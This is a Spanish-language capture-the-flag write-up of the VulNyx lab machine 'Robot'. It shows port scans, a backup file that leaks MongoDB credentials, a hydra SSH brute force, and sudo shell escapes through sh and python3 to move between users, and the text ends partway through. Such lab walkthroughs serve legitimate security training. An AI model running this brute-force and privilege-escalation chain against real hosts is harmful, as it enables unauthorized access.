<!DOCTYPE html>
<html lang="es"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
<meta http-equiv="content-type" content="text/html">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title itemprop="name">VulNyx - Robot | noname</title>
<meta property="og:title" content="VulNyx - Robot | noname" />
<meta name="twitter:title" content="VulNyx - Robot | noname" />
<meta itemprop="name" content="VulNyx - Robot | noname" />
<meta name="application-name" content="VulNyx - Robot | noname" />
<meta property="og:site_name" content="" />

<meta name="description" content="Writeup Robot üîµ">
<meta itemprop="description" content="Writeup Robot üîµ" />
<meta property="og:description" content="Writeup Robot üîµ" />
<meta name="twitter:description" content="Writeup Robot üîµ" />

<meta property="og:locale" content="es" />
<meta name="language" content="es" />

  <link rel="alternate" hreflang="en" href="http://localhost:1313/writeups/nyx/robot/" title="" />



  <meta itemprop="image" content="http://localhost:1313/images/logo.png" />
  <meta property="og:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image" content="http://localhost:1313/images/logo.png" />
  <meta name="twitter:image:src" content="http://localhost:1313/images/logo.png" />




    
    
    

    <meta property="og:type" content="article" />
    <meta property="og:article:published_time" content=2024-05-26T11:40:11&#43;0200 />
    <meta property="article:published_time" content=2024-05-26T11:40:11&#43;0200 />

    

    

    <script defer type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "Article",
        "headline": "VulNyx - Robot",
        "author": {
        "@type": "Person",
        "name": ""
        },
        "datePublished": "2024-05-26",
        "description": "Writeup Robot üîµ",
        "wordCount":  1504 ,
        "mainEntityOfPage": "True",
        "dateModified": "2024-05-26",
        "image": {
        "@type": "imageObject",
        "url": "\/images\/logo.png"
        },
        "publisher": {
        "@type": "Organization",
        "name": "noname"
        }
    }
    </script>

<meta name="generator" content="Hugo 0.140.0">

    

    <link rel="canonical" href="http://localhost:1313/writeups/nyx/robot/">
    <link href="/style.min.d43bc6c79baa87f006efb2b92be952faeedeb1a3ab626c1d6abda52eae049355.css" rel="stylesheet">
    <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">

    
    <link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/icons/favicon-16x16.png">
    <link rel="mask-icon" href="/icons/safari-pinned-tab.svg">
    <link rel="shortcut icon" href="/favicon.ico">




<link rel="manifest" href="http://localhost:1313/site.webmanifest">

<meta name="msapplication-config" content="/browserconfig.xml">
<meta name="msapplication-TileColor" content="#2d89ef">
<meta name="theme-color" content="#434648">

    
    <link rel="icon" type="image/svg+xml" href="/icons/favicon.svg">

    </head>
<body data-theme = "" class="notransition">

<script src="/js/theme.js"></script>

<div class="navbar" role="navigation">
    <nav class="menu" aria-label="Main Navigation">
        <a href="http://localhost:1313/" class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" 
viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" 
stroke-linejoin="round" class="feather feather-home">
<title></title>
<path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"></path>
<polyline points="9 22 9 12 15 12 15 22"></polyline>
</svg>
        </a>
        <input type="checkbox" id="menu-trigger" class="menu-trigger" />
        <label for="menu-trigger">
            <span class="menu-icon">
                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" stroke="currentColor" fill="none" viewBox="0 0 14 14"><title>Menu</title><path stroke-linecap="round" stroke-linejoin="round" d="M10.595 7L3.40726 7"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 3.51488L3.49301 3.51488"></path><path stroke-linecap="round" stroke-linejoin="round" d="M10.5096 10.4851H3.49301"></path><path stroke-linecap="round" stroke-linejoin="round" d="M0.5 12.5V1.5C0.5 0.947715 0.947715 0.5 1.5 0.5H12.5C13.0523 0.5 13.5 0.947715 13.5 1.5V12.5C13.5 13.0523 13.0523 13.5 12.5 13.5H1.5C0.947715 13.5 0.5 13.0523 0.5 12.5Z"></path></svg>
            </span>
        </label>

        <div class="trigger">
            <ul class="trigger-container">
                
                
                <li>
                    <a class="menu-link " href="/">
                        $ home
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackmyvm/">
                        $ hmv
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/hackthebox/">
                        $ htb
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/posts/vulnyx/">
                        $ nyx
                    </a>
                    
                </li>
                
                <li>
                    <a class="menu-link " href="/whoami/">
                        $ whoami
                    </a>
                    
                </li>
                
                <li class="menu-separator">
                    <span>|</span>
                </li>
                
                
            </ul>
            <a id="mode" href="#">
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-sunny" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>LIGHT</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
                <svg xmlns="http://www.w3.org/2000/svg" class="mode-moon" width="21" height="21" viewBox="0 0 14 14" stroke-width="1">
<title>DARK</title><g><circle cx="7" cy="7" r="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></circle><line x1="7" y1="0.5" x2="7" y2="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="2.4" x2="3.82" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="0.5" y1="7" x2="2.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="2.4" y1="11.6" x2="3.82" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="7" y1="13.5" x2="7" y2="11.5" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="11.6" x2="10.18" y2="10.18" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="13.5" y1="7" x2="11.5" y2="7" fill="none" stroke-linecap="round" stroke-linejoin="round"></line><line x1="11.6" y1="2.4" x2="10.18" y2="3.82" fill="none" stroke-linecap="round" stroke-linejoin="round"></line></g></svg>
            </a>
        </div>
    </nav>
</div>

<div class="wrapper post">
    <main class="page-content" aria-label="Content">
        <article>
            <header class="header">
                <h1 class="header-title">VulNyx - Robot</h1>
                
                
                <div class="post-meta">
                    <time datetime="2024-05-26T11:40:11&#43;02:00" itemprop="datePublished"> May 26, 2024 </time>
                </div>
                
            </header>
            
            <div class="page-content">
                <p><img src="/../machines/nyx/robot/robot_logo.webp" alt="logo"></p>
<ul>
<li><em>Steganography - (Exiftool)</em></li>
<li><em>Information Leakage Backup - (Mongodb)</em></li>
<li><em>Brute Force SSH - (Hydra)</em></li>
<li><em>Abusing sh Binary - (Sudo/User Pivoting)</em></li>
<li><em>Abusing python3 Binary - (Sudo/User Pivoting)</em></li>
<li><em>Abusing awk Binary - (Sudo/User Pivoting)</em></li>
<li><em>Abusing zzuf Binary - (Sudo/Privesc)</em></li>
</ul>
<h3 id="escaneo-de-puertos">Escaneo de puertos</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -p- -sS --min-rate 5000 -vvv -n -Pn 172.0.100.26
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE REASON
</span></span><span class="line"><span class="cl">22/tcp    open  ssh     syn-ack ttl 64
</span></span><span class="line"><span class="cl">80/tcp    open  http    syn-ack ttl 64
</span></span><span class="line"><span class="cl">27017/tcp open  mongod  syn-ack ttl 64
</span></span></code></pre></div><h3 id="escaneo-de-servicios">Escaneo de servicios</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ nmap -sVC -p 22,80,27017 172.0.100.26
</span></span><span class="line"><span class="cl">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-21 15:40 CEST
</span></span><span class="line"><span class="cl">Nmap scan report for 172-0-100-26.lightspeed.stlsmo.sbcglobal.net (172.0.100.26)
</span></span><span class="line"><span class="cl">Host is up (0.00037s latency).
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
</span></span><span class="line"><span class="cl">22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
</span></span><span class="line"><span class="cl">| ssh-hostkey: 
</span></span><span class="line"><span class="cl">|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
</span></span><span class="line"><span class="cl">|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
</span></span><span class="line"><span class="cl">|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
</span></span><span class="line"><span class="cl">80/tcp    open  http    Apache httpd 2.4.56 ((Debian))
</span></span><span class="line"><span class="cl">|_http-title: Hello Friend
</span></span><span class="line"><span class="cl">|_http-server-header: Apache/2.4.56 (Debian)
</span></span><span class="line"><span class="cl">27017/tcp open  mongodb MongoDB 5.0.21
</span></span><span class="line"><span class="cl">| mongodb-info: 
</span></span><span class="line"><span class="cl">|   MongoDB Build info
</span></span><span class="line"><span class="cl">|     allocator = tcmalloc
</span></span><span class="line"><span class="cl">|     bits = 64
</span></span><span class="line"><span class="cl">|     versionArray
</span></span><span class="line"><span class="cl">|       2 = 21
</span></span><span class="line"><span class="cl">|       1 = 0
</span></span><span class="line"><span class="cl">|       0 = 5
</span></span><span class="line"><span class="cl">|       3 = 0
</span></span><span class="line"><span class="cl">|     buildEnvironment
</span></span><span class="line"><span class="cl">|       distarch = x86_64
</span></span><span class="line"><span class="cl">|       distmod = debian10
</span></span><span class="line"><span class="cl">|       target_arch = x86_64
</span></span><span class="line"><span class="cl">|       cxxflags = -Woverloaded-virtual -Wno-maybe-uninitialized -fsized-deallocation -std=c++17
</span></span><span class="line"><span class="cl">|       ccflags = -Werror -include mongo/platform/basic.h -ffp-contract=off -fasynchronous-unwind-tables -ggdb -Wall -Wsign-compare -Wno-unknown-pragmas -Winvalid-pch -fno-omit-frame-pointer -fno-strict-aliasing -O2 -march=sandybridge -mtune=generic -mprefer-vector-width=128 -Wno-unused-local-typedefs -Wno-unused-function -Wno-deprecated-declarations -Wno-unused-const-variable -Wno-unused-but-set-variable -Wno-missing-braces -fstack-protector-strong -Wa,--nocompress-debug-sections -fno-builtin-memcmp
</span></span><span class="line"><span class="cl">|       linkflags = -Wl,--fatal-warnings -pthread -Wl,-z,now -fuse-ld=gold -fstack-protector-strong -Wl,--no-threads -Wl,--build-id -Wl,--hash-style=gnu -Wl,-z,noexecstack -Wl,--warn-execstack -Wl,-z,relro -Wl,--compress-debug-sections=none -Wl,-z,origin -Wl,--enable-new-dtags
</span></span><span class="line"><span class="cl">|       target_os = linux
</span></span><span class="line"><span class="cl">|       cxx = /opt/mongodbtoolchain/v3/bin/g++: g++ (GCC) 8.5.0
</span></span><span class="line"><span class="cl">|       cppdefines = SAFEINT_USE_INTRINSICS 0 PCRE_STATIC NDEBUG _XOPEN_SOURCE 700 _GNU_SOURCE _FORTIFY_SOURCE 2 BOOST_THREAD_VERSION 5 BOOST_THREAD_USES_DATETIME BOOST_SYSTEM_NO_DEPRECATED BOOST_MATH_NO_LONG_DOUBLE_MATH_FUNCTIONS BOOST_ENABLE_ASSERT_DEBUG_HANDLER BOOST_LOG_NO_SHORTHAND_NAMES BOOST_LOG_USE_NATIVE_SYSLOG BOOST_LOG_WITHOUT_THREAD_ATTR ABSL_FORCE_ALIGNED_ACCESS
</span></span><span class="line"><span class="cl">|       cc = /opt/mongodbtoolchain/v3/bin/gcc: gcc (GCC) 8.5.0
</span></span><span class="line"><span class="cl">|     ok = 1.0
</span></span><span class="line"><span class="cl">|     javascriptEngine = mozjs
</span></span><span class="line"><span class="cl">|     maxBsonObjectSize = 16777216
</span></span><span class="line"><span class="cl">|     storageEngines
</span></span><span class="line"><span class="cl">|       2 = wiredTiger
</span></span><span class="line"><span class="cl">|       1 = ephemeralForTest
</span></span><span class="line"><span class="cl">|       0 = devnull
</span></span><span class="line"><span class="cl">|     openssl
</span></span><span class="line"><span class="cl">|       compiled = OpenSSL 1.1.1n  15 Mar 2022
</span></span><span class="line"><span class="cl">|       running = OpenSSL 1.1.1n  15 Mar 2022
</span></span><span class="line"><span class="cl">|     debug = false
</span></span><span class="line"><span class="cl">|     modules
</span></span><span class="line"><span class="cl">|     version = 5.0.21
</span></span><span class="line"><span class="cl">|     sysInfo = deprecated
</span></span><span class="line"><span class="cl">|     gitVersion = 4fad44a858d8ee2d642566fc8872ef410f6534e4
</span></span><span class="line"><span class="cl">|   Server status
</span></span><span class="line"><span class="cl">|     codeName = Unauthorized
</span></span><span class="line"><span class="cl">|     ok = 0.0
</span></span><span class="line"><span class="cl">|     code = 13
</span></span><span class="line"><span class="cl">|_    errmsg = command serverStatus requires authentication
</span></span><span class="line"><span class="cl">| mongodb-databases: 
</span></span><span class="line"><span class="cl">|   codeName = Unauthorized
</span></span><span class="line"><span class="cl">|   ok = 0.0
</span></span><span class="line"><span class="cl">|   code = 13
</span></span><span class="line"><span class="cl">|_  errmsg = command listDatabases requires authentication
</span></span><span class="line"><span class="cl">| fingerprint-strings: 
</span></span><span class="line"><span class="cl">|   FourOhFourRequest, GetRequest: 
</span></span><span class="line"><span class="cl">|     HTTP/1.0 200 OK
</span></span><span class="line"><span class="cl">|     Connection: close
</span></span><span class="line"><span class="cl">|     Content-Type: text/plain
</span></span><span class="line"><span class="cl">|     Content-Length: 85
</span></span><span class="line"><span class="cl">|     looks like you are trying to access MongoDB over HTTP on the native driver port.
</span></span><span class="line"><span class="cl">|   mongodb: 
</span></span><span class="line"><span class="cl">|     errmsg
</span></span><span class="line"><span class="cl">|     command serverStatus requires authentication
</span></span><span class="line"><span class="cl">|     code
</span></span><span class="line"><span class="cl">|     codeName
</span></span><span class="line"><span class="cl">|_    Unauthorized
</span></span><span class="line"><span class="cl">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span></code></pre></div><h3 id="http-tcp---80">HTTP TCP - 80</h3>
<p><img src="/../machines/nyx/robot/http.webp" alt="http"></p>
<p>Al inspeccionar el c√≥digo fuente puedo ver el nombre de la imagen.</p>
<p><img src="/../machines/nyx/robot/cf.webp" alt="cf"></p>
<p>Me descargo la imagen con wget.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ wget http://172.0.100.26/image.jpg
</span></span><span class="line"><span class="cl">--2024-05-21 16:32:48--  http://172.0.100.26/image.jpg
</span></span><span class="line"><span class="cl">Connecting to 172.0.100.26:80... connected.
</span></span><span class="line"><span class="cl">HTTP request sent, awaiting response... 200 OK
</span></span><span class="line"><span class="cl">Length: 681686 (666K) [image/jpeg]
</span></span><span class="line"><span class="cl">Saving to: ‚Äòimage.jpg‚Äô
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">image.jpg                                          100%[================================================================================================================&gt;] 665.71K  --.-KB/s    in 0.001s  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">2024-05-21 16:32:48 (534 MB/s) - ‚Äòimage.jpg‚Äô saved [681686/681686]
</span></span></code></pre></div><p>Con <strong>exiftool</strong> obtengo los metadatos de la <code>imagen.jpg</code> y en el apartado comentario encuentro <strong>B4ckUp_3LLi0t/</strong> .</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ exiftool image.jpg
</span></span><span class="line"><span class="cl">ExifTool Version Number         : 12.76
</span></span><span class="line"><span class="cl">File Name                       : image.jpg
</span></span><span class="line"><span class="cl">Directory                       : .
</span></span><span class="line"><span class="cl">File Size                       : 682 kB
</span></span><span class="line"><span class="cl">File Modification Date/Time     : 2023:10:06 14:50:53+02:00
</span></span><span class="line"><span class="cl">File Access Date/Time           : 2024:05:21 16:32:48+02:00
</span></span><span class="line"><span class="cl">File Inode Change Date/Time     : 2024:05:21 16:32:48+02:00
</span></span><span class="line"><span class="cl">File Permissions                : -rw-r--r--
</span></span><span class="line"><span class="cl">File Type                       : JPEG
</span></span><span class="line"><span class="cl">File Type Extension             : jpg
</span></span><span class="line"><span class="cl">MIME Type                       : image/jpeg
</span></span><span class="line"><span class="cl">Comment                         : B4ckUp_3LLi0t/
</span></span><span class="line"><span class="cl">Image Width                     : 1920
</span></span><span class="line"><span class="cl">Image Height                    : 1080
</span></span><span class="line"><span class="cl">Encoding Process                : Baseline DCT, Huffman coding
</span></span><span class="line"><span class="cl">Bits Per Sample                 : 8
</span></span><span class="line"><span class="cl">Color Components                : 3
</span></span><span class="line"><span class="cl">Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
</span></span><span class="line"><span class="cl">Image Size                      : 1920x1080
</span></span><span class="line"><span class="cl">Megapixels                      : 2.1
</span></span></code></pre></div><p>Visualizo el nuevo directorio y encuentro otra imagen.</p>
<p><img src="/../machines/nyx/robot/elliot.webp" alt="elliot"></p>
<p>Realizo fuerza bruta de extensiones que est√©n relacionadas con archivos de <strong>backup</strong> ya que el nuevo directorio me da una pista sobre que extensiones buscar.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ gobuster dir -u 172.0.100.26/B4ckUp_3LLi0t -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -x zip,tar,bak
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Gobuster v3.6
</span></span><span class="line"><span class="cl">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">[+] Url:                     http://172.0.100.26/B4ckUp_3LLi0t
</span></span><span class="line"><span class="cl">[+] Method:                  GET
</span></span><span class="line"><span class="cl">[+] Threads:                 10
</span></span><span class="line"><span class="cl">[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
</span></span><span class="line"><span class="cl">[+] Negative Status codes:   404
</span></span><span class="line"><span class="cl">[+] User Agent:              gobuster/3.6
</span></span><span class="line"><span class="cl">[+] Extensions:              zip,tar,bak
</span></span><span class="line"><span class="cl">[+] Timeout:                 10s
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">Starting gobuster in directory enumeration mode
</span></span><span class="line"><span class="cl">===============================================================
</span></span><span class="line"><span class="cl">/connect.bak          (Status: 200) [Size: 266]
</span></span></code></pre></div><p>Lanzo una petici√≥n GET al archivo <code>connect.bak</code> y encuentro unas credenciales para <strong>mongodb</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ curl -s http://172.0.100.26/B4ckUp_3LLi0t/connect.bak
</span></span><span class="line"><span class="cl">&lt;?php
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">$client = new MongoDB\Client(
</span></span><span class="line"><span class="cl">    &#39;mongodb://127.0.0.1:27017&#39;
</span></span><span class="line"><span class="cl">    [
</span></span><span class="line"><span class="cl">        &#39;username&#39; =&gt; &#39;mongo&#39;,
</span></span><span class="line"><span class="cl">        &#39;password&#39; =&gt; &#39;m*******z&#39;,
</span></span><span class="line"><span class="cl">        &#39;ssl&#39; =&gt; true,
</span></span><span class="line"><span class="cl">        &#39;replicaSet&#39; =&gt; &#39;myReplicaSet&#39;,
</span></span><span class="line"><span class="cl">        &#39;authSource&#39; =&gt; &#39;admin&#39;,
</span></span><span class="line"><span class="cl">	&#39;db&#39; =&gt; &#39;elliot&#39;,
</span></span><span class="line"><span class="cl">    ],
</span></span><span class="line"><span class="cl">);
</span></span></code></pre></div><h3 id="mongo-tcp---27017">Mongo TCP - 27017</h3>
<p>Para conectarme a la base de datos de Mongo necesito instalar <strong>mongodb</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">sudo apt install mongodb
</span></span></code></pre></div><p>Me conecto a la base de datos con el nombre <strong>elliot</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ mongo -host 172.0.100.26 -u &#39;mongo&#39; -p &#39;m*******z&#39; elliot
</span></span><span class="line"><span class="cl">MongoDB shell version v6.1.1
</span></span><span class="line"><span class="cl">connecting to: mongodb://172.0.100.26:27017/elliot?compressors=disabled&amp;gssapiServiceName=mongodb
</span></span><span class="line"><span class="cl">Implicit session: session { &#34;id&#34; : UUID(&#34;e9f1b640-989e-46b8-a56d-8120b8f8c22f&#34;) }
</span></span><span class="line"><span class="cl">MongoDB server version: 5.0.21
</span></span><span class="line"><span class="cl">WARNING: shell and server versions do not match
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">Warning: the &#34;mongo&#34; shell has been superseded by &#34;mongosh&#34;,
</span></span><span class="line"><span class="cl">which delivers improved usability and compatibility.The &#34;mongo&#34; shell has been deprecated and will be removed in
</span></span><span class="line"><span class="cl">an upcoming release.
</span></span><span class="line"><span class="cl">For installation instructions, see
</span></span><span class="line"><span class="cl">https://docs.mongodb.com/mongodb-shell/install/
</span></span><span class="line"><span class="cl">================
</span></span><span class="line"><span class="cl">Welcome to the MongoDB shell.
</span></span><span class="line"><span class="cl">For interactive help, type &#34;help&#34;.
</span></span><span class="line"><span class="cl">For more comprehensive documentation, see
</span></span><span class="line"><span class="cl">	https://docs.mongodb.com/
</span></span><span class="line"><span class="cl">Questions? Try the MongoDB Developer Community Forums
</span></span><span class="line"><span class="cl">	https://community.mongodb.com
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></div><p>Obtengo la ayuda con el comando help.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; help
</span></span><span class="line"><span class="cl">	db.help()                    help on db methods
</span></span><span class="line"><span class="cl">	db.mycoll.help()             help on collection methods
</span></span><span class="line"><span class="cl">	sh.help()                    sharding helpers
</span></span><span class="line"><span class="cl">	rs.help()                    replica set helpers
</span></span><span class="line"><span class="cl">	help admin                   administrative help
</span></span><span class="line"><span class="cl">	help connect                 connecting to a db help
</span></span><span class="line"><span class="cl">	help keys                    key shortcuts
</span></span><span class="line"><span class="cl">	help misc                    misc things to know
</span></span><span class="line"><span class="cl">	help mr                      mapreduce
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">	show dbs                     show database names
</span></span><span class="line"><span class="cl">	show collections             show collections in current database
</span></span><span class="line"><span class="cl">	show users                   show users in current database
</span></span><span class="line"><span class="cl">	show profile                 show most recent system.profile entries with time &gt;= 1ms
</span></span><span class="line"><span class="cl">	show logs                    show the accessible logger names
</span></span><span class="line"><span class="cl">	show log [name]              prints out the last segment of log in memory, &#39;global&#39; is default
</span></span><span class="line"><span class="cl">	use &lt;db_name&gt;                set current database
</span></span><span class="line"><span class="cl">	db.mycoll.find()             list objects in collection mycoll
</span></span><span class="line"><span class="cl">	db.mycoll.find( { a : 1 } )  list objects in mycoll where a == 1
</span></span><span class="line"><span class="cl">	it                           result of the last line evaluated; use to further iterate
</span></span><span class="line"><span class="cl">	DBQuery.shellBatchSize = x   set default number of items to display on shell
</span></span><span class="line"><span class="cl">	exit                         quit the mongo shell
</span></span><span class="line"><span class="cl">&gt; 
</span></span></code></pre></div><p>Con <strong>show dbs</strong> listo el nombre de las bases de datos.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; show dbs
</span></span><span class="line"><span class="cl">elliot  0.000GB
</span></span></code></pre></div><p>Con el m√©todo <strong>find()</strong> obtengo la lista de objetos de la colecci√≥n <strong>elliot</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">&gt; db.elliot.find()
</span></span><span class="line"><span class="cl">{ &#34;_id&#34; : ObjectId(&#34;651fdd9171f44c265b976d17&#34;), &#34;FirstName&#34; : &#34;Elliot&#34;, &#34;Surname&#34; : &#34;Alderson&#34;, &#34;Nickname&#34; : &#34;MrRobot&#34;, &#34;Birthdate&#34; : &#34;17091986&#34; }
</span></span></code></pre></div><p>Ahora creo un diccionario personalizado con la herramienta <strong>cupp</strong>.</p>
<p><img src="/../machines/nyx/robot/cupp.webp" alt="cupp"></p>
<p>Realizo fuerza bruta al servicio <strong>SSH</strong> y al usuario <strong>elliot</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ hydra -t 20 -l elliot -P elliot.txt ssh://172.0.100.26 -V -F -I
</span></span><span class="line"><span class="cl">[22][ssh] host: 172.0.100.26   login: elliot   password: t*********6
</span></span></code></pre></div><p>Me conecto al sistema.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">‚ùØ ssh elliot@172.0.100.26
</span></span><span class="line"><span class="cl">elliot@172.0.100.26&#39;s password: 
</span></span><span class="line"><span class="cl">elliot@robot:~$ id
</span></span><span class="line"><span class="cl">uid=1000(elliot) gid=1000(elliot) grupos=1000(elliot)
</span></span></code></pre></div><p>Enumero permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">elliot@robot:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for elliot on robot:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User elliot may run the following commands on robot:
</span></span><span class="line"><span class="cl">    (darlene) NOPASSWD: /usr/bin/sh
</span></span></code></pre></div><p>Paso de usuario <strong>elliot</strong> a <strong>darlene</strong> de la siguiente forma.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">elliot@robot:~$ sudo -u darlene /usr/bin/sh
</span></span><span class="line"><span class="cl">$ bash -i
</span></span><span class="line"><span class="cl">darlene@robot:/home/elliot$ id
</span></span><span class="line"><span class="cl">uid=1001(darlene) gid=1001(darlene) grupos=1001(darlene)
</span></span></code></pre></div><p>Enumero de nuevo permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">darlene@robot:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for darlene on robot:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User darlene may run the following commands on robot:
</span></span><span class="line"><span class="cl">    (angela) NOPASSWD: /usr/bin/python3
</span></span></code></pre></div><p>Busco informaci√≥n del binario¬†<strong>python</strong>¬†en¬†<strong>gtfobins</strong>.</p>
<p><img src="/../machines/nyx/robot/gtfobins.webp" alt="gtfobins"></p>
<p>Paso de usuaria <strong>darlene</strong> a usuaria <strong>angela</strong>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">darlene@robot:~$ sudo -u angela /usr/bin/python3 -c &#39;import os; os.system(&#34;/bin/sh&#34;)&#39;
</span></span><span class="line"><span class="cl">$ bash -i
</span></span><span class="line"><span class="cl">angela@robot:/home/darlene$ id
</span></span><span class="line"><span class="cl">uid=1002(angela) gid=1002(angela) grupos=1002(angela)
</span></span></code></pre></div><p>Enumero otra vez permisos de sudo.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">angela@robot:~$ sudo -l
</span></span><span class="line"><span class="cl">Matching Defaults entries for angela on robot:
</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
</span></span><span class="line"><span class="cl">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User angela may run the following commands on robot:
</span></span><span class="line"><span class="cl">    (tyrell) NOPASSWD: /usr/bin/awk
</span></span></code></pre></div><p>Busco informaci√≥n del binario¬†<strong>awk</strong>¬†en¬†<strong>gtfobins</strong>.</p>
